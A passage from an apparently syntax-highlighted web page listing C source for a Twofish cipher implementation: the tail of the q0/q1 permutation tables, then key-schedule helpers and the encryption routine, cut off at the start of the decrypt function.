class="number">0x23</span>,<span class="number">0x19</span>,<span class="number">0x5b</span>,<span class="number">0x3d</span>,<span class="number">0x59</span>,<span class="number">0xf3</span>,<span class="number">0xae</span>,<span class="number">0xa2</span>,<span class="number">0x82</span>,</span><br><span class="line"><span class="number">0x63</span>,<span class="number">0x1</span>,<span class="number">0x83</span>,<span class="number">0x2e</span>,<span class="number">0xd9</span>,<span class="number">0x51</span>,<span class="number">0x9b</span>,<span class="number">0x7c</span>,<span class="number">0xa6</span>,<span class="number">0xeb</span>,<span class="number">0xa5</span>,<span class="number">0xbe</span>,<span class="number">0x16</span>,<span class="number">0xc</span>,<span class="number">0xe3</span>,<span class="number">0x61</span>,</span><br><span class="line"><span class="number">0xc0</span>,<span class="number">0x8c</span>,<span class="number">0x3a</span>,<span class="number">0xf5</span>,<span class="number">0x73</span>,<span class="number">0x2c</span>,<span class="number">0x25</span>,<span class="number">0xb</span>,<span class="number">0xbb</span>,<span class="number">0x4e</span>,<span class="number">0x89</span>,<span class="number">0x6b</span>,<span class="number">0x53</span>,<span class="number">0x6a</span>,<span class="number">0xb4</span>,<span class="number">0xf1</span>,</span><br><span class="line"><span class="number">0xe1</span>,<span class="number">0xe6</span>,<span class="number">0xbd</span>,<span class="number">0x45</span>,<span class="number">0xe2</span>,<span class="number">0xf4</span>,<span class="number">0xb6</span>,<span class="number">0x66</span>,<span class="number">0xcc</span>,<span class="number">0x95</span>,<span class="number">0x3</span>,<span class="number">0x56</span>,<span class="number">0xd4</span>,<span class="number">0x1c</span>,<span class="number">0x1e</span>,<span class="number">0xd7</span>,</span><br><span class="line"><span class="number">0xfb</span>,<span class="number">0xc3</span>,<span class="number">0x8e</span>,<span class="number">0xb5</span>,<span class="number">0xe9</span>,<span class="number">0xcf</span>,<span class="number">0xbf</span>,<span class="number">0xba</span>,<span class="number">0xea</span>,<span class="number">0x77</span>,<span class="number">0x39</span>,<span class="number">0xaf</span>,<span class="number">0x33</span>,<span class="number">0xc9</span>,<span class="number">0x62</span>,<span class="number">0x71</span>,</span><br><span class="line"><span class="number">0x81</span>,<span class="number">0x79</span>,<span class="number">0x9</span>,<span class="number">0xad</span>,<span class="number">0x24</span>,<span class="number">0xcd</span>,<span class="number">0xf9</span>,<span class="number">0xd8</span>,<span class="number">0xe5</span>,<span class="number">0xc5</span>,<span class="number">0xb9</span>,<span class="number">0x4d</span>,<span class="number">0x44</span>,<span class="number">0x8</span>,<span class="number">0x86</span>,<span class="number">0xe7</span>,</span><br><span class="line"><span class="number">0xa1</span>,<span class="number">0x1d</span>,<span class="number">0xaa</span>,<span class="number">0xed</span>,<span class="number">0x6</span>,<span class="number">0x70</span>,<span class="number">0xb2</span>,<span class="number">0xd2</span>,<span class="number">0x41</span>,<span class="number">0x7b</span>,<span class="number">0xa0</span>,<span class="number">0x11</span>,<span class="number">0x31</span>,<span class="number">0xc2</span>,<span class="number">0x27</span>,<span class="number">0x90</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0xf6</span>,<span class="number">0x60</span>,<span class="number">0xff</span>,<span class="number">0x96</span>,<span class="number">0x5c</span>,<span class="number">0xb1</span>,<span class="number">0xab</span>,<span class="number">0x9e</span>,<span class="number">0x9c</span>,<span class="number">0x52</span>,<span class="number">0x1b</span>,<span class="number">0x5f</span>,<span class="number">0x93</span>,<span class="number">0xa</span>,<span class="number">0xef</span>,</span><br><span class="line"><span class="number">0x91</span>,<span class="number">0x85</span>,<span class="number">0x49</span>,<span class="number">0xee</span>,<span class="number">0x2d</span>,<span class="number">0x4f</span>,<span class="number">0x8f</span>,<span class="number">0x3b</span>,<span class="number">0x47</span>,<span class="number">0x87</span>,<span class="number">0x6d</span>,<span class="number">0x46</span>,<span class="number">0xd6</span>,<span class="number">0x3e</span>,<span class="number">0x69</span>,<span class="number">0x64</span>,</span><br><span class="line"><span class="number">0x2a</span>,<span class="number">0xce</span>,<span class="number">0xcb</span>,<span class="number">0x2f</span>,<span class="number">0xfc</span>,<span class="number">0x97</span>,<span class="number">0x5</span>,<span class="number">0x7a</span>,<span class="number">0xac</span>,<span class="number">0x7f</span>,<span class="number">0xd5</span>,<span class="number">0x1a</span>,<span class="number">0x4b</span>,<span class="number">0xe</span>,<span class="number">0xa7</span>,<span class="number">0x5a</span>,</span><br><span class="line"><span class="number">0x28</span>,<span class="number">0x14</span>,<span class="number">0x3f</span>,<span class="number">0x29</span>,<span class="number">0x88</span>,<span class="number">0x3c</span>,<span class="number">0x4c</span>,<span class="number">0x2</span>,<span class="number">0xb8</span>,<span class="number">0xda</span>,<span class="number">0xb0</span>,<span class="number">0x17</span>,<span class="number">0x55</span>,<span class="number">0x1f</span>,<span class="number">0x8a</span>,<span class="number">0x7d</span>,</span><br><span class="line"><span class="number">0x57</span>,<span class="number">0xc7</span>,<span class="number">0x8d</span>,<span class="number">0x74</span>,<span class="number">0xb7</span>,<span class="number">0xc4</span>,<span class="number">0x9f</span>,<span class="number">0x72</span>,<span class="number">0x7e</span>,<span class="number">0x15</span>,<span class="number">0x22</span>,<span class="number">0x12</span>,<span class="number">0x58</span>,<span class="number">0x7</span>,<span class="number">0x99</span>,<span class="number">0x34</span>,</span><br><span class="line"><span class="number">0x6e</span>,<span class="number">0x50</span>,<span class="number">0xde</span>,<span class="number">0x68</span>,<span class="number">0x65</span>,<span class="number">0xbc</span>,<span class="number">0xdb</span>,<span class="number">0xf8</span>,<span class="number">0xc8</span>,<span class="number">0xa8</span>,<span class="number">0x2b</span>,<span class="number">0x40</span>,<span class="number">0xdc</span>,<span class="number">0xfe</span>,<span class="number">0x32</span>,<span class="number">0xa4</span>,</span><br><span class="line"><span class="number">0xca</span>,<span class="number">0x10</span>,<span class="number">0x21</span>,<span class="number">0xf0</span>,<span class="number">0xd3</span>,<span class="number">0x5d</span>,<span class="number">0xf</span>,<span class="number">0x0</span>,<span class="number">0x6f</span>,<span class="number">0x9d</span>,<span class="number">0x36</span>,<span class="number">0x42</span>,<span class="number">0x4a</span>,<span class="number">0x5e</span>,<span class="number">0xc1</span>,<span class="number">0xe0</span></span><br><span class="line">&#125;,</span><br><span class="line">    <span class="comment">/* q1 */</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line"><span class="number">0x75</span>,<span class="number">0xf3</span>,<span class="number">0xc6</span>,<span class="number">0xf4</span>,<span class="number">0xdb</span>,<span class="number">0x7b</span>,<span class="number">0xfb</span>,<span class="number">0xc8</span>,<span class="number">0x4a</span>,<span class="number">0xd3</span>,<span class="number">0xe6</span>,<span class="number">0x6b</span>,<span class="number">0x45</span>,<span class="number">0x7d</span>,<span class="number">0xe8</span>,<span class="number">0x4b</span>,</span><br><span class="line"><span class="number">0xd6</span>,<span class="number">0x32</span>,<span class="number">0xd8</span>,<span class="number">0xfd</span>,<span class="number">0x37</span>,<span class="number">0x71</span>,<span class="number">0xf1</span>,<span class="number">0xe1</span>,<span class="number">0x30</span>,<span class="number">0xf</span>,<span class="number">0xf8</span>,<span class="number">0x1b</span>,<span class="number">0x87</span>,<span class="number">0xfa</span>,<span class="number">0x6</span>,<span class="number">0x3f</span>,</span><br><span class="line"><span class="number">0x5e</span>,<span class="number">0xba</span>,<span class="number">0xae</span>,<span class="number">0x5b</span>,<span class="number">0x8a</span>,<span class="number">0x0</span>,<span class="number">0xbc</span>,<span class="number">0x9d</span>,<span class="number">0x6d</span>,<span class="number">0xc1</span>,<span class="number">0xb1</span>,<span class="number">0xe</span>,<span class="number">0x80</span>,<span class="number">0x5d</span>,<span class="number">0xd2</span>,<span class="number">0xd5</span>,</span><br><span class="line"><span class="number">0xa0</span>,<span class="number">0x84</span>,<span class="number">0x7</span>,<span class="number">0x14</span>,<span class="number">0xb5</span>,<span class="number">0x90</span>,<span class="number">0x2c</span>,<span class="number">0xa3</span>,<span class="number">0xb2</span>,<span class="number">0x73</span>,<span class="number">0x4c</span>,<span class="number">0x54</span>,<span class="number">0x92</span>,<span class="number">0x74</span>,<span class="number">0x36</span>,<span class="number">0x51</span>,</span><br><span class="line"><span class="number">0x38</span>,<span class="number">0xb0</span>,<span class="number">0xbd</span>,<span class="number">0x5a</span>,<span class="number">0xfc</span>,<span class="number">0x60</span>,<span class="number">0x62</span>,<span class="number">0x96</span>,<span class="number">0x6c</span>,<span class="number">0x42</span>,<span class="number">0xf7</span>,<span class="number">0x10</span>,<span class="number">0x7c</span>,<span class="number">0x28</span>,<span class="number">0x27</span>,<span class="number">0x8c</span>,</span><br><span class="line"><span class="number">0x13</span>,<span class="number">0x95</span>,<span class="number">0x9c</span>,<span class="number">0xc7</span>,<span class="number">0x24</span>,<span class="number">0x46</span>,<span class="number">0x3b</span>,<span class="number">0x70</span>,<span class="number">0xca</span>,<span class="number">0xe3</span>,<span class="number">0x85</span>,<span class="number">0xcb</span>,<span class="number">0x11</span>,<span class="number">0xd0</span>,<span class="number">0x93</span>,<span class="number">0xb8</span>,</span><br><span class="line"><span class="number">0xa6</span>,<span class="number">0x83</span>,<span class="number">0x20</span>,<span class="number">0xff</span>,<span class="number">0x9f</span>,<span class="number">0x77</span>,<span class="number">0xc3</span>,<span class="number">0xcc</span>,<span class="number">0x3</span>,<span class="number">0x6f</span>,<span class="number">0x8</span>,<span class="number">0xbf</span>,<span class="number">0x40</span>,<span class="number">0xe7</span>,<span class="number">0x2b</span>,<span class="number">0xe2</span>,</span><br><span class="line"><span class="number">0x79</span>,<span class="number">0xc</span>,<span class="number">0xaa</span>,<span class="number">0x82</span>,<span class="number">0x41</span>,<span class="number">0x3a</span>,<span class="number">0xea</span>,<span class="number">0xb9</span>,<span class="number">0xe4</span>,<span class="number">0x9a</span>,<span class="number">0xa4</span>,<span class="number">0x97</span>,<span class="number">0x7e</span>,<span class="number">0xda</span>,<span class="number">0x7a</span>,<span class="number">0x17</span>,</span><br><span class="line"><span class="number">0x66</span>,<span class="number">0x94</span>,<span class="number">0xa1</span>,<span class="number">0x1d</span>,<span class="number">0x3d</span>,<span class="number">0xf0</span>,<span class="number">0xde</span>,<span class="number">0xb3</span>,<span class="number">0xb</span>,<span class="number">0x72</span>,<span class="number">0xa7</span>,<span class="number">0x1c</span>,<span class="number">0xef</span>,<span class="number">0xd1</span>,<span class="number">0x53</span>,<span class="number">0x3e</span>,</span><br><span class="line"><span class="number">0x8f</span>,<span class="number">0x33</span>,<span class="number">0x26</span>,<span class="number">0x5f</span>,<span class="number">0xec</span>,<span class="number">0x76</span>,<span class="number">0x2a</span>,<span class="number">0x49</span>,<span class="number">0x81</span>,<span class="number">0x88</span>,<span class="number">0xee</span>,<span class="number">0x21</span>,<span class="number">0xc4</span>,<span class="number">0x1a</span>,<span class="number">0xeb</span>,<span class="number">0xd9</span>,</span><br><span class="line"><span class="number">0xc5</span>,<span class="number">0x39</span>,<span class="number">0x99</span>,<span class="number">0xcd</span>,<span class="number">0xad</span>,<span class="number">0x31</span>,<span class="number">0x8b</span>,<span class="number">0x1</span>,<span class="number">0x18</span>,<span class="number">0x23</span>,<span class="number">0xdd</span>,<span class="number">0x1f</span>,<span class="number">0x4e</span>,<span class="number">0x2d</span>,<span class="number">0xf9</span>,<span class="number">0x48</span>,</span><br><span class="line"><span class="number">0x4f</span>,<span class="number">0xf2</span>,<span class="number">0x65</span>,<span class="number">0x8e</span>,<span class="number">0x78</span>,<span class="number">0x5c</span>,<span class="number">0x58</span>,<span class="number">0x19</span>,<span class="number">0x8d</span>,<span class="number">0xe5</span>,<span class="number">0x98</span>,<span class="number">0x57</span>,<span class="number">0x67</span>,<span class="number">0x7f</span>,<span class="number">0x5</span>,<span class="number">0x64</span>,</span><br><span class="line"><span class="number">0xaf</span>,<span class="number">0x63</span>,<span class="number">0xb6</span>,<span class="number">0xfe</span>,<span class="number">0xf5</span>,<span class="number">0xb7</span>,<span class="number">0x3c</span>,<span class="number">0xa5</span>,<span class="number">0xce</span>,<span class="number">0xe9</span>,<span class="number">0x68</span>,<span class="number">0x44</span>,<span class="number">0xe0</span>,<span class="number">0x4d</span>,<span class="number">0x43</span>,<span class="number">0x69</span>,</span><br><span class="line"><span class="number">0x29</span>,<span class="number">0x2e</span>,<span class="number">0xac</span>,<span class="number">0x15</span>,<span class="number">0x59</span>,<span class="number">0xa8</span>,<span class="number">0xa</span>,<span class="number">0x9e</span>,<span class="number">0x6e</span>,<span class="number">0x47</span>,<span class="number">0xdf</span>,<span class="number">0x34</span>,<span class="number">0x35</span>,<span class="number">0x6a</span>,<span class="number">0xcf</span>,<span class="number">0xdc</span>,</span><br><span class="line"><span class="number">0x22</span>,<span class="number">0xc9</span>,<span class="number">0xc0</span>,<span class="number">0x9b</span>,<span class="number">0x89</span>,<span class="number">0xd4</span>,<span class="number">0xed</span>,<span class="number">0xab</span>,<span class="number">0x12</span>,<span class="number">0xa2</span>,<span class="number">0xd</span>,<span class="number">0x52</span>,<span class="number">0xbb</span>,<span class="number">0x2</span>,<span class="number">0x2f</span>,<span class="number">0xa9</span>,</span><br><span class="line"><span class="number">0xd7</span>,<span class="number">0x61</span>,<span class="number">0x1e</span>,<span class="number">0xb4</span>,<span class="number">0x50</span>,<span class="number">0x4</span>,<span class="number">0xf6</span>,<span class="number">0xc2</span>,<span class="number">0x16</span>,<span class="number">0x25</span>,<span class="number">0x86</span>,<span class="number">0x56</span>,<span class="number">0x55</span>,<span class="number">0x9</span>,<span class="number">0xbe</span>,<span class="number">0x91</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure></div><p>twofish.c</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"twofish.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"tables.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> xor(g,r)    (g^r)                   <span class="comment">/* Xor operation */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ror(g,n)    ((g&gt;&gt;n)|(g&lt;&lt;(32-n)))    <span class="comment">/* Rotate right  */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rol(g,n)    ((g<span class="meta-string">&lt;&lt;n)|(g&gt;&gt;(32-n)))    /* Rotate left   */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> nxt(g,r)    (*(g+r))                <span class="comment">/* Get next byte */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LITTILE_ENDIAN</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span>  LITTILE_ENDIAN</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unpack(g,r) ((g&gt;&gt;(r*8))&amp;0xff)                               <span class="comment">/* Extracts a byte from a word.  */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pack(g)     ((*(g))|(*(g+1)&lt;&lt;8)|(*(g+2)&lt;&lt;16)|(*(g+3)&lt;&lt;24))  <span class="comment">/* Converts four byte to a word. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rsm(i,a,b,c,d,e,f,g,h)  \</span></span><br><span class="line">        gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>),a,<span class="number">0x14d</span>)^gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>+<span class="number">1</span>),b,<span class="number">0x14d</span>)^\</span><br><span class="line">        gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>+<span class="number">2</span>),c,<span class="number">0x14d</span>)^gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>+<span class="number">3</span>),d,<span class="number">0x14d</span>)^\</span><br><span class="line">        gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>+<span class="number">4</span>),e,<span class="number">0x14d</span>)^gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>+<span class="number">5</span>),f,<span class="number">0x14d</span>)^\</span><br><span class="line">        gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>+<span class="number">6</span>),g,<span class="number">0x14d</span>)^gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>+<span class="number">7</span>),h,<span class="number">0x14d</span>)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> u(x,a)\</span></span><br><span class="line">        x[<span class="number">0</span>] = unpack(a,<span class="number">0</span>); \</span><br><span class="line">        x[<span class="number">1</span>] = unpack(a,<span class="number">1</span>); \</span><br><span class="line">        x[<span class="number">2</span>] = unpack(a,<span class="number">2</span>); \</span><br><span class="line">        x[<span class="number">3</span>] = unpack(a,<span class="number">3</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> release(a,b,c)  &#123; free(a); free(b);free(c); &#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span>  TWOFISH</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">key_t</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint8_t</span> len;</span><br><span class="line">    <span class="keyword">uint8_t</span> *k;</span><br><span class="line">&#125;<span class="keyword">key_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">subkey_t</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint8_t</span> len;</span><br><span class="line">    <span class="keyword">uint8_t</span> s[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> me[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> mo[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line">&#125;<span class="keyword">subkey_t</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Twofish Expand Key Function</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param   s</span></span><br><span class="line"><span class="comment"> * @param   len</span></span><br><span class="line"><span class="comment"> * @usage</span></span><br><span class="line"><span class="comment"> * &#123;@code&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">key_t</span>* <span class="title">expand_key</span><span class="params">(<span class="keyword">uint8_t</span> *s, <span class="keyword">uint32_t</span> len)</span></span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Twofish Galois Field Multiplication Function</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param   x</span></span><br><span class="line"><span class="comment"> * @param   y</span></span><br><span class="line"><span class="comment"> * @param   m</span></span><br><span class="line"><span class="comment"> * @usage</span></span><br><span class="line"><span class="comment"> * &#123;@code&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">uint8_t</span> <span class="title">gf</span><span class="params">(<span class="keyword">uint8_t</span> x, <span class="keyword">uint8_t</span> y, <span class="keyword">uint16_t</span> m)</span></span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Twofish Generate Subkeys Function</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param   tf_key</span></span><br><span class="line"><span class="comment"> * @usage</span></span><br><span class="line"><span class="comment"> * &#123;@code&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">subkey_t</span>* <span class="title">Twofish_generate_subkey</span><span class="params">(<span class="keyword">key_t</span>* tf_key)</span></span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Twofish h Function</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param   x[]</span></span><br><span class="line"><span class="comment"> * @param   y[]</span></span><br><span class="line"><span class="comment"> * @param   s</span></span><br><span class="line"><span class="comment"> * @param   stage</span></span><br><span class="line"><span class="comment"> * @usage</span></span><br><span class="line"><span class="comment"> * &#123;@code&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Twofish_h</span><span class="params">(<span class="keyword">uint8_t</span> x[],  <span class="keyword">uint8_t</span> y[], <span class="keyword">uint8_t</span> s[][<span class="number">4</span>], <span class="keyword">int</span> stage)</span></span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Twofish MDS Multiply Function</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param   y[]</span></span><br><span class="line"><span class="comment"> * @param   out[]</span></span><br><span class="line"><span class="comment"> * @usage</span></span><br><span class="line"><span class="comment"> * &#123;@code&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Twofish_mds_mul</span><span class="params">(<span class="keyword">uint8_t</span> y[],  <span class="keyword">uint8_t</span> out[])</span></span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Twofish Genrate Extended K Keys Function</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param   tf_twofish</span></span><br><span class="line"><span class="comment"> * @param   tf_subkey</span></span><br><span class="line"><span class="comment"> * @param   p</span></span><br><span class="line"><span class="comment"> * @param   k</span></span><br><span class="line"><span class="comment"> * @usage</span></span><br><span class="line"><span class="comment"> * &#123;@code&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">twofish_t</span>* <span class="title">Twofish_generate_ext_k_keys</span><span class="params">(<span class="keyword">twofish_t</span>* tf_twofish, <span class="keyword">subkey_t</span> *tf_subkey,<span class="keyword">uint32_t</span> p, <span class="keyword">uint8_t</span> k)</span></span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Twofish Genrate Extended S Keys Function</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param   tf_twofish</span></span><br><span class="line"><span class="comment"> * @param   tf_subkey</span></span><br><span class="line"><span class="comment"> * @param   k</span></span><br><span class="line"><span class="comment"> * @usage</span></span><br><span class="line"><span class="comment"> * &#123;@code&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">twofish_t</span>* <span class="title">Twofish_generate_ext_s_keys</span><span class="params">(<span class="keyword">twofish_t</span>* tf_twofish, <span class="keyword">subkey_t</span> *tf_subkey, <span class="keyword">uint8_t</span> k)</span></span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Twofish f Function</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param   tf_twofish</span></span><br><span class="line"><span class="comment"> * @param   r</span></span><br><span class="line"><span class="comment"> * @param   r0, r1</span></span><br><span class="line"><span class="comment"> * @param   f0, f1</span></span><br><span class="line"><span class="comment"> * @usage</span></span><br><span class="line"><span class="comment"> * &#123;@code&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Twofish_f</span><span class="params">(<span class="keyword">twofish_t</span>* tf_twofish, <span class="keyword">uint8_t</span> r,<span class="keyword">uint32_t</span> r0, <span class="keyword">uint32_t</span> r1, <span class="keyword">uint32_t</span>* f0, <span class="keyword">uint32_t</span>* f1)</span></span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Twofish g Function</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param   tf_twofish</span></span><br><span class="line"><span class="comment"> * @param   x</span></span><br><span class="line"><span class="comment"> * @usage</span></span><br><span class="line"><span class="comment"> * &#123;@code&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">Twofish_g</span><span class="params">(<span class="keyword">twofish_t</span>* tf_twofish, <span class="keyword">uint32_t</span> x)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">twofish_t</span>* <span class="title">Twofish_setup</span><span class="params">(<span class="keyword">uint8_t</span> *s, <span class="keyword">uint32_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* Expand the key if necessary. */</span></span><br><span class="line">    <span class="keyword">key_t</span>* tf_key = expand_key(s, len/<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Generate subkeys: s and k */</span></span><br><span class="line">    <span class="keyword">subkey_t</span> *tf_subkey = Twofish_generate_subkey(tf_key);</span><br><span class="line">     </span><br><span class="line">    <span class="comment">/* Generate 40 K keys */</span></span><br><span class="line">    <span class="keyword">twofish_t</span>* tf_twofish = (<span class="keyword">twofish_t</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">twofish_t</span>));</span><br><span class="line">    tf_twofish = Twofish_generate_ext_k_keys(tf_twofish,tf_subkey,<span class="number">0x01010101</span>,(tf_key-&gt;len/<span class="number">8</span>));</span><br><span class="line">    <span class="comment">/* Generate 4x256 S keys */</span></span><br><span class="line">    tf_twofish = Twofish_generate_ext_s_keys(tf_twofish,tf_subkey,(tf_key-&gt;len/<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Free memory */</span></span><br><span class="line">    release(tf_key-&gt;k, tf_key, tf_subkey);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tf_twofish;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Twofish_encryt</span><span class="params">(<span class="keyword">twofish_t</span>* tf_twofish, <span class="keyword">uint8_t</span> *data, <span class="keyword">uint8_t</span> *cypher)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> r0, r1, r2, r3, f0, f1, c2,c3;</span><br><span class="line">    <span class="comment">/* Input Whitenening */</span></span><br><span class="line">    r0 = tf_twofish-&gt;k[<span class="number">0</span>]^pack(data);</span><br><span class="line">    r1 = tf_twofish-&gt;k[<span class="number">1</span>]^pack(data+<span class="number">4</span>);</span><br><span class="line">    r2 = tf_twofish-&gt;k[<span class="number">2</span>]^pack(data+<span class="number">8</span>);</span><br><span class="line">    r3 = tf_twofish-&gt;k[<span class="number">3</span>]^pack(data+<span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The black box */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">16</span>;++i)</span><br><span class="line">    &#123;</span><br><span class="line">        Twofish_f(tf_twofish, i, r0, r1, &amp;f0, &amp;f1);</span><br><span class="line">        c2 = ror((f0^r2), <span class="number">1</span>);</span><br><span class="line">        c3 = (f1^rol(r3,<span class="number">1</span>));</span><br><span class="line">        <span class="comment">/* swap */</span></span><br><span class="line">        r2 = r0;</span><br><span class="line">        r3 = r1;</span><br><span class="line">        r0 = c2;</span><br><span class="line">        r1 = c3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Output Whitening */</span></span><br><span class="line">    c2 = r0;</span><br><span class="line">    c3 = r1;</span><br><span class="line">    r0 = tf_twofish-&gt;k[<span class="number">4</span>]^r2;</span><br><span class="line">    r1 = tf_twofish-&gt;k[<span class="number">5</span>]^r3;</span><br><span class="line">    r2 = tf_twofish-&gt;k[<span class="number">6</span>]^c2;</span><br><span class="line">    r3 = tf_twofish-&gt;k[<span class="number">7</span>]^c3;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;++i)</span><br><span class="line">    &#123;</span><br><span class="line">        cypher[i]   = unpack(r0,i);</span><br><span class="line">        cypher[i+<span class="number">4</span>] = unpack(r1,i);</span><br><span class="line">        cypher[i+<span class="number">8</span>] = unpack(r2,i);</span><br><span class="line">        cypher[i+<span class="number">12</span>]= unpack(r3,i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Twofish_decryt</span><span class="params">(<span class="keyword">twofish_t</span>* tf_twofish, <span class="keyword">uint8_t</span> *cypher, <span 